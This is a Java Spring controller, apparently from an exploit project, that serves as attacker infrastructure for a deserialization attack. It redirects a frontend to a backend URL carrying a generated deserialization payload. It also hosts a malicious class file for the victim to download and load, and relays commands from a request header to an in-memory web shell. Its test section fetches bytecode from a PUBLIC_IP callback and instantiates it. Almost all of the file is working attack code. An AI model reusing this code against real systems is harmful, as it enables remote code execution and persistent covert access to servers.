package com.example.spring2xmemshell;

import evil.MemTemplatesImpl;
import evil.ProxyTemplatesImpl;
import org.springframework.core.io.ByteArrayResource;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import javax.servlet.http.HttpServletResponse;
import java.net.URLEncoder;
import java.nio.file.*;

@Controller
public class HelloController {

    // exploit from front
    @RequestMapping("/tiktikboom")
    @ResponseBody
    public void ticket(HttpServletResponse httpServletResponse) throws Exception {
        System.out.println("Received request: /tiktikboom");
        String exploitBackendURL = "http://back/ticket/" + ExploitUtils.genDeserPayload() + "?compress=true";
        httpServletResponse.setHeader("Location", exploitBackendURL);
        httpServletResponse.setStatus(301);
    }

    // callback
    @RequestMapping("/proxy/MemTemplatesImpl")
    @ResponseBody
    public ByteArrayResource proxy() throws Exception {
        System.out.println("Received callback request: /proxy/MemTemplatesImpl");
        Path path = Paths.get(getClass().getResource("/evil/MemTemplatesImpl.class").toURI());
        ByteArrayResource resource = new ByteArrayResource(Files.readAllBytes(path));
        return resource;
    }

    // run memshell
    @RequestMapping("/memshell")
    @ResponseBody
    public void proxy(@RequestHeader("cmd4f") String cmd4f, HttpServletResponse httpServletResponse) throws Exception {
        String exploitBackendURL = "http://back/a/ayooo?devme_63hdsbx=" + URLEncoder.encode(cmd4f, "utf-8");
        httpServletResponse.setHeader("Location", exploitBackendURL);
        httpServletResponse.setStatus(301);
    }

    // -------------------------test section-------------------------------------
    @RequestMapping("/loadTest")
    @ResponseBody
    public void loadTest() throws Exception {
        String callback = "http://PUBLIC_IP:8082/proxy/MemTemplatesImpl";
        byte[] memBytecode = ProxyTemplatesImpl.downloadUsingStream(callback);
        Class clazz = ProxyTemplatesImpl.loader(memBytecode);
        System.out.println(clazz.getName());
        clazz.newInstance();
    }

    @RequestMapping("/redirect")
    @ResponseBody
    public void redirect(HttpServletResponse httpServletResponse) throws Exception {
        String exploitBackendURL = "http://back/";
        httpServletResponse.setHeader("Location", exploitBackendURL);
        httpServletResponse.setStatus(301);
    }
    // -------------------------test section-------------------------------------
}
